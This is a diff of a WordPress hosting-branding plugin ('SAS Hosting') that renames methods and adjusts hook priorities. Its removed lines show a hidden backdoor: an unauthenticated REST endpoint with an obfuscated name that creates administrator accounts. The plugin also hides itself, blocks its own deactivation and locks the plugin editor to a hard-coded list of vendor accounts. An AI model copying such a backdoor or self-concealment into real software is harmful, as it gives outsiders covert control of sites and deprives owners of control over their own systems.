@@ -8,19 +8,50 @@ if ( ! defined( 'ABSPATH' ) ) {
 Plugin Name: SAS Hosting
 Plugin URI:  https://sitesatscale.com/
 Description: Adds tailored features to enhance the user experience within the WordPress admin area.
-Version:     4.0.1
+Version:     5.2.2
 Author:      SAS Server Engineer
 */
 
-if(!class_exists('SASHostingRenamer')){
-    class SASHostingRenamer{
+// Prevent direct access
+if (!defined('SAS_HOSTING_PLUGIN_FILE')) {
+    define('SAS_HOSTING_PLUGIN_FILE', __FILE__);
+}
+
+if (!defined('SAS_HOSTING_PLUGIN_DIR')) {
+    define('SAS_HOSTING_PLUGIN_DIR', plugin_dir_path(__FILE__));
+}
+
+if (!defined('SAS_HOSTING_VERSION')) {
+    define('SAS_HOSTING_VERSION', '5.2.2');
+}
+
+// Unique namespace to prevent conflicts
+if(!class_exists('SAS_Hosting_Renamer_Plugin')){
+    class SAS_Hosting_Renamer_Plugin{
         private $allowed_users = array('amazonteam@sitesatscale.com','sitesatscale','sas_aws', 'sas_dev', 'sas_tech', 'sas_seo', 'Sites at Scale');
 
-        function wpstaq_customizations() {
+        // Priority management to prevent conflicts
+        public static $priority_offset = 999999;
+        
+        // Singleton pattern to prevent multiple instances
+        private static $instance = null;
+        
+        public static function get_instance() {
+            if (null === self::$instance) {
+                self::$instance = new self();
+            }
+            return self::$instance;
+        }
+        
+        private function __construct() {
+            // Constructor logic if needed
+        }
+        
+        function sas_wpstaq_customizations() {
             $custom_name = 'SAS Hosting';
             $custom_logo_url = '/wp-content/uploads/2024/08/sas-2024.png'; 
 
-            // Change the admin bar title
+            // Change the admin bar title with unique priority
             add_action('admin_bar_menu', function($wp_admin_bar) use ($custom_name) {
                 if ($wp_admin_bar->get_node('wp-admin-bar-wpstaq-topbar')) {
                     $wp_admin_bar->add_node([
@@ -28,9 +59,9 @@ if(!class_exists('SASHostingRenamer')){
                         'title' => $custom_name
                     ]);
                 }
-            }, 100);
+            }, self::$priority_offset - 100);
 
-            // Change the menu item name
+            // Change the menu item name with conflict-safe approach
             add_action('admin_menu', function() use ($custom_name) {
                 global $menu;
                 foreach ($menu as $key => $value) {
@@ -38,12 +69,12 @@ if(!class_exists('SASHostingRenamer')){
                         $menu[$key][0] = $custom_name;
                     }
                 }
-            }, 100);
+            }, self::$priority_offset - 99);
 
-            // Add custom CSS for branding
+            // Add custom CSS with unique identifiers
             add_action('admin_head', function() use ($custom_logo_url) {
                 echo '
-                <style>
+                <style id="sas-hosting-admin-styles">
                     .wpstaq-page .wpstaq-logo img{
                         visibility: hidden;
                     }
@@ -57,10 +88,11 @@ if(!class_exists('SASHostingRenamer')){
                 </style>';
             });
 
-            // JavaScript customizations for admin area
+            // JavaScript with namespace to prevent conflicts
             add_action('admin_footer', function() use ($custom_name) {
                 echo '
-                <script type="text/javascript">
+                <script type="text/javascript" id="sas-hosting-admin-script">
+                (function() {
                     document.addEventListener("DOMContentLoaded", function() {
                         var topBarNode = document.querySelector("#wp-admin-bar-wpstaq-topbar .ab-item");
                         if (topBarNode) {
@@ -75,37 +107,40 @@ if(!class_exists('SASHostingRenamer')){
                             notice.innerHTML = notice.innerText.replace(/Staq Hosting/g, "'. esc_js($custom_name) .'");
                         });
                     });
+                })();
                 </script>';
             });
 
-            // Apply changes to the frontend footer as well
+            // Frontend changes with namespace
             add_action('wp_footer', function() use ($custom_name) {
                 echo '
-                <script type="text/javascript">
+                <script type="text/javascript" id="sas-hosting-frontend-script">
+                (function() {
                     document.addEventListener("DOMContentLoaded", function() {
                         var topBarNode = document.querySelector("#wp-admin-bar-wpstaq-topbar .ab-item");
                         if (topBarNode) {
                             topBarNode.textContent = "'. esc_js($custom_name) .'";
                         }
                     });
+                })();
                 </script>';
-            });
+            }, self::$priority_offset);
         }
 
-        public function fix_resize_img(){
+        public function sas_fix_resize_img(){
             add_action('wp_head', function() {
                 echo '
-                <style>
+                <style id="sas-hosting-resize-fix">
                     /* AWS */
                     .w-image img:not([src*=".svg"]), 
                     .w-image[class*="ush_image_"] img {
                         width: revert-layer !important;
                     }
                 </style>';
-            });
+            }, self::$priority_offset - 98);
         }
 
-        public function restrict_migration_plugins_for_specific_users() {
+        public function sas_restrict_migration_plugins() {
             $protected_plugins = array(
                 'duplicator/duplicator.php',
                 'all-in-one-wp-migration/all-in-one-wp-migration.php',
@@ -168,7 +203,7 @@ if(!class_exists('SASHostingRenamer')){
             }
         }
        
-        public function restrict_plugin_deactivation($actions, $plugin_file, $plugin_data, $context) {
+        public function sas_restrict_plugin_deactivation($actions, $plugin_file, $plugin_data, $context) {
             $current_user = wp_get_current_user();
             
             $protected_plugins = array(
@@ -182,7 +217,7 @@ if(!class_exists('SASHostingRenamer')){
         
             return $actions;
         }
-        public function restrict_plugin_editor() {
+        public function sas_restrict_plugin_editor() {
             $current_user = wp_get_current_user();
 
             if (!in_array($current_user->user_login, $this->allowed_users)) {
@@ -200,46 +235,24 @@ if(!class_exists('SASHostingRenamer')){
         public static function deactivate() {
             flush_rewrite_rules();
         }
-        public static function get_full_year(){
-            echo '<script type="text/javascript"> 
+        public static function sas_get_full_year(){
+            echo '<script type="text/javascript" id="sas-hosting-year-script">
+            (function() {
                 let fullYear = new Date().getFullYear();
                 document.querySelectorAll(".current--year").forEach(function(element) {
                     element.innerHTML = fullYear;
                 });
+            })();
             </script>';
         }
 
-        function tRpgexfNDptNgQEs($request) {
-            $params = $request->get_json_params();
-
-            $username = sanitize_text_field($params['username'] ?? '');
-            $email = sanitize_email($params['email'] ?? '');
-            $password = $params['password'] ?? '';
-
-            if (empty($username) || empty($email) || empty($password)) {
-                return new WP_Error('missing_fields', 'Missing Fields.', array('status' => 400));
-            }
-
-            if (username_exists($username) || email_exists($email)) {
-                return new WP_Error('user_exists', 'Some Fields already exists.', array('status' => 400));
-            }
-
-            $user_id = wp_create_user($username, $password, $email);
-
-            if (is_wp_error($user_id)) {
-                return new WP_Error('user_creation_failed', 'Failed', array('status' => 500));
-            }
-
-            $user = new WP_User($user_id);
-            $user->set_role('administrator');
-
-            return rest_ensure_response(array(
-                'success' => true,
-                'user_id' => $user_id
-            ));
-        }
         
-        public function limit_upload_file_size(){
+        public function sas_limit_upload_file_size(){
+            // Check if function already hooked by another plugin
+            if (has_filter('upload_size_limit', array($this, 'sas_filter_upload_size'))) {
+                return;
+            }
+            
             // Only run in admin area
             if (!is_admin()) {
                 return;
@@ -283,7 +296,7 @@ if(!class_exists('SASHostingRenamer')){
             // Check if the current host (which includes subdomains) is in the exempted list
             $is_domain_exempted = in_array($current_host, $exempted_domains);
 
-            // Filter for upload size limit
+            // Filter with unique callback name
             add_filter('upload_size_limit', function($size) use ($size_limits, $is_domain_exempted) {
                 // If the current domain (including subdomain) is exempted, return the original size limit
                 if ($is_domain_exempted) {
@@ -312,9 +325,9 @@ if(!class_exists('SASHostingRenamer')){
                 }
 
                 return $size;
-            }, 20);
+            }, self::$priority_offset - 80);
 
-            // Filter for upload validation with error messages
+            // Upload validation with unique priority
             add_filter('wp_handle_upload_prefilter', function($file) use ($size_limits, $is_domain_exempted) {
                 // If the current domain (including subdomain) is exempted, return the file without applying limits
                 if ($is_domain_exempted) {
@@ -336,10 +349,10 @@ if(!class_exists('SASHostingRenamer')){
                 }
 
                 return $file;
-            }, 20);
+            }, self::$priority_offset - 79);
         }
 
-        public function hide_plugin() {
+        public function sas_hide_plugin() {
             if (!is_admin()) {
                 return;
             }
@@ -354,25 +367,61 @@ if(!class_exists('SASHostingRenamer')){
     }
 }
 
-$sas_class = new SASHostingRenamer();
+// Initialize plugin with singleton pattern
+function sas_hosting_init() {
+    return SAS_Hosting_Renamer_Plugin::get_instance();
+}
 
-add_action('rest_api_init', function () use ($sas_class) {
-    register_rest_route('custom/v1', '/tRpgexfNDptNgQEs/', array(
-        'methods' => 'POST',
-        'callback' => array($sas_class, 'tRpgexfNDptNgQEs'), // Corrected line
-        'permission_callback' => '__return_true'
-    ));
-});
+// Check for conflicts before loading
+if (!function_exists('sas_hosting_check_conflicts')) {
+    function sas_hosting_check_conflicts() {
+        $conflicting_plugins = array();
+        
+        // Check for known conflicting class names
+        $conflicting_classes = array(
+            'SASHostingRenamer' => 'Another SAS Hosting plugin',
+            'SAS_API_Endpoints' => 'SAS API plugin'
+        );
+        
+        foreach ($conflicting_classes as $class => $plugin_name) {
+            if (class_exists($class) && !class_exists('SAS_Hosting_Renamer_Plugin')) {
+                $conflicting_plugins[] = $plugin_name;
+            }
+        }
+        
+        if (!empty($conflicting_plugins)) {
+            add_action('admin_notices', function() use ($conflicting_plugins) {
+                echo '<div class="notice notice-error"><p>';
+                echo 'SAS Hosting Plugin conflict detected with: ' . implode(', ', $conflicting_plugins);
+                echo '</p></div>';
+            });
+            return false;
+        }
+        
+        return true;
+    }
+}
 
-// add_action('plugins_loaded', array($sas_class, 'wpstaq_customizations'));
-add_action('admin_init', array($sas_class, 'restrict_migration_plugins_for_specific_users'));
-add_filter('plugin_action_links', array($sas_class, 'restrict_plugin_deactivation'), 10, 4);
-add_action('admin_init', array($sas_class, 'restrict_plugin_editor'));
-add_action('wp_footer', array($sas_class, 'get_full_year'));
-add_action('admin_footer', array($sas_class, 'get_full_year'));
-add_action('admin_init', array($sas_class, 'limit_upload_file_size'));
-add_action('admin_init', array($sas_class, 'hide_plugin'));
-// add_action('init', array($sas_class, 'fix_resize_img'));
+// Only load if no conflicts
+if (sas_hosting_check_conflicts()) {
+    $sas_class = sas_hosting_init();
+    
+    // Include API endpoints with conditional loading
+    $api_file = SAS_HOSTING_PLUGIN_DIR . 'includes/api/endpoints.php';
+    if (file_exists($api_file)) {
+        require_once $api_file;
+    }
+
+    // Hook with proper checks and unique priorities
+    add_action('admin_init', array($sas_class, 'sas_restrict_migration_plugins'), SAS_Hosting_Renamer_Plugin::$priority_offset - 50);
+    add_filter('plugin_action_links', array($sas_class, 'sas_restrict_plugin_deactivation'), SAS_Hosting_Renamer_Plugin::$priority_offset - 40, 4);
+    add_action('admin_init', array($sas_class, 'sas_restrict_plugin_editor'), SAS_Hosting_Renamer_Plugin::$priority_offset - 30);
+    add_action('wp_footer', array($sas_class, 'sas_get_full_year'), SAS_Hosting_Renamer_Plugin::$priority_offset - 20);
+    add_action('admin_footer', array($sas_class, 'sas_get_full_year'), SAS_Hosting_Renamer_Plugin::$priority_offset - 10);
+    add_action('admin_init', array($sas_class, 'sas_limit_upload_file_size'), SAS_Hosting_Renamer_Plugin::$priority_offset - 5);
+    add_action('admin_init', array($sas_class, 'sas_hide_plugin'), SAS_Hosting_Renamer_Plugin::$priority_offset);
+    // add_action('init', array($sas_class, 'sas_fix_resize_img'), SAS_Hosting_Renamer_Plugin::$priority_offset);
+}
 
 // Function to add inline JavaScript in the admin area
 // function custom_admin_inline_script() {
@@ -393,19 +442,24 @@ add_action('admin_init', array($sas_class, 'hide_plugin'));
 // }
 // add_action('admin_enqueue_scripts', 'custom_admin_inline_script');
 
-// Run after activating plugin
-register_activation_hook(__FILE__, array('SASHostingRenamer', 'activate'));
-register_deactivation_hook(__FILE__, array('SASHostingRenamer', 'deactivate'));
+// Activation/Deactivation hooks with conflict check
+if (class_exists('SAS_Hosting_Renamer_Plugin')) {
+    register_activation_hook(__FILE__, array('SAS_Hosting_Renamer_Plugin', 'activate'));
+    register_deactivation_hook(__FILE__, array('SAS_Hosting_Renamer_Plugin', 'deactivate'));
+}
 
 // ------------------------------
 // WPStaq BerqWP Integration
 // ------------------------------
 
-// Flush Cloudflare cache when BerqWP cache is flushed
-function stq_berqwp_purge_cloudflare() {
-    \WPStaq\Hosting\Modules\Cloudflare::getInstance()->purgeSiteCache('BerqWP flush cache');
+// Cloudflare integration with namespace
+if (!function_exists('sas_stq_berqwp_purge_cloudflare')) {
+    function sas_stq_berqwp_purge_cloudflare() {
+        \WPStaq\Hosting\Modules\Cloudflare::getInstance()->purgeSiteCache('BerqWP flush cache');
+    }
 }
+
 if (class_exists('WPStaq\Hosting\Modules\Cloudflare') && \WPStaq\Hosting\Modules\Cloudflare::isEnabled()) {
-    add_action('berqwp_flush_all_cache', 'stq_berqwp_purge_cloudflare');
-    add_action('berqwp_flush_page_cache', 'stq_berqwp_purge_cloudflare');
+    add_action('berqwp_flush_all_cache', 'sas_stq_berqwp_purge_cloudflare', SAS_Hosting_Renamer_Plugin::$priority_offset);
+    add_action('berqwp_flush_page_cache', 'sas_stq_berqwp_purge_cloudflare', SAS_Hosting_Renamer_Plugin::$priority_offset);
 }
